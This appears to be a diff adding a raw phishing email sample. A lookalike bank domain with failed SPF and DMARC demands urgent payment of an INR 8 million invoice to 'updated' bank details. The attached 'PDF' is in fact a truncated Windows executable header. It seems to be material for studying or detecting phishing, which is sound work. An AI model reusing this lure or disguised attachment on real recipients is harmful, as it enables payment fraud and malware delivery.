@@ -1,0 +1,71 @@
+From: "Aurora Freight Accounts" <billing@hdfcbank-secure-in.xyz>
+To: Arjun Gupta <arjun.gupta@kalyaniworks.in>
+Subject: Purchase order INV-2026-8302 needs your approval
+Date: Mon, 11 May 2026 21:39:00 +0000
+Message-ID: <178772093932.6.9561350687707443456@hdfcbank-secure-in.xyz>
+Return-Path: <bounce-9051@hdfcbank-secure-in.xyz>
+MIME-Version: 1.0
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mx.kalyaniworks.in (Postfix) with ESMTPS id EB8FF15A242D for
+ <recipient@kalyaniworks.in>; Mon, 11 May 2026 21:39:00 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ mx1.mail-relay.example (Postfix) with ESMTPS id 02B378A3AED5; Mon, 11 May
+ 2026 21:37:18 +0000
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by mail.gateway.example (Postfix) with ESMTPS id 3B93410A18BB; Mon, 11 May
+ 2026 21:34:39 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=192.0.2.10;
+ envelope-from=<bounce@hdfcbank-secure-in.xyz>;
+Authentication-Results: mx.hdfcbank-secure-in.xyz; spf=fail
+ smtp.mailfrom=hdfcbank-secure-in.xyz; dkim=none
+ header.d=hdfcbank-secure-in.xyz; dmarc=fail (p=reject)
+ header.from=hdfcbank-secure-in.xyz
+Content-Type: multipart/mixed; boundary="===============2803012144869792872=="
+
+--===============2803012144869792872==
+Content-Type: multipart/alternative;
+ boundary="===============6686133559790621122=="
+
+--===============6686133559790621122==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Arjun,
+
+Please find attached invoice INV-2026-8302 for INR 8,036,000, now overdue. Ki=
+ndly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Daniel Verma
+Accounts Receivable, Aurora Freight
+
+--===============6686133559790621122==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Arjun,</p><p>Please find attached invoice INV-2026-8302 =
+for INR 8,036,000, now overdue. Kindly review the attached statement and proc=
+ess this payment immediately to avoid service interruption.</p><p>If the bank=
+ details have changed since your last remittance, use the updated account inf=
+ormation in the attachment.</p><p>Regards, Daniel Verma Accounts Receivable, =
+Aurora Freight</p></body></html>
+
+--===============6686133559790621122==--
+
+--===============2803012144869792872==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement_INV-2026-8302.pdf"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============2803012144869792872==--
